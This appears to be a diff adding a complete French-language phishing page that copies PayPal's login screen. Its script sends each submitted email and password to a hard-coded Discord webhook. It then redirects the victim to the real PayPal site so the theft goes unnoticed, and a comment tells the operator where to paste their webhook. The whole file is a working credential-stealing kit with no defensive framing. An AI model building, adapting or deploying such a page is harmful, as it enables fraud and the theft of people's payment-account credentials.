@@ -1,1 +1,167 @@
-# Paypal.com
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - PayPal</title>
+    <style>
+        body {
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #f5f7fa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: white;
+            width: 400px;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+        
+        .logo img {
+            width: 100px; 
+        }
+
+        h2 {
+            font-size: 16px;
+            color: #2c2e2f;
+            margin-bottom: 20px;
+            font-weight: normal;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+
+        input[type="email"], 
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccd0d5;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0070ba;
+            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.2);
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #0070ba;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 17px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+
+        button:hover {
+            background-color: #005fb8;
+        }
+
+        .footer-links {
+            margin-top: 20px;
+            font-size: 13px;
+        }
+
+        .footer-links a {
+            color: #0070ba;
+            text-decoration: none;
+        }
+
+        .loading {
+            display: none;
+            margin-top: 10px;
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">
+        <!-- Logo officiel PayPal -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal Logo">
+    </div>
+    
+    <h2>Connectez-vous pour continuer</h2>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <label for="email">Adresse e-mail ou num�ro de portable</label>
+            <input type="email" id="email" name="email" required placeholder="nom@exemple.com">
+        </div>
+
+        <div class="input-group">
+            <label for="password">Mot de passe</label>
+            <input type="password" id="password" name="password" required>
+        </div>
+
+        <button type="submit">Se connecter</button>
+        
+        <div class="loading" id="loadingText">V�rification...</div>
+    </form>
+
+    <div class="footer-links">
+        <a href="#">Mot de passe oubli� ?</a> | <a href="#">Cr�er un compte</a>
+    </div>
+</div>
+
+<script>
+    // --- CONFIGURATION DISCORD ---
+    // COLLE TON URL DE WEBHOOK ICI D�S QUE TU L'AURAS G�N�R�
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1562446783353724953/OU5qLmft4vUMX-ToTUXLDmpbq7Zf0zB72apP_xu6ddE9Aj9SIrBKTEQ2LFjJHwf0moVo'; 
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        document.getElementById('loadingText').style.display = 'block';
+
+        // Envoi des donn�es vers Discord
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `?? **NOUVELLE CONNEXION PAYPAL !** ??\n\n?? **Email :** ${email}\n?? **Mot de passe :** ${password}`
+            })
+        });
+
+        // Redirection vers le vrai site apr�s 1.5s
+        setTimeout(function() {
+            window.location.href = "https://www.paypal.com";
+        }, 1500);
+    });
+</script>
+
+</body>
+</html>
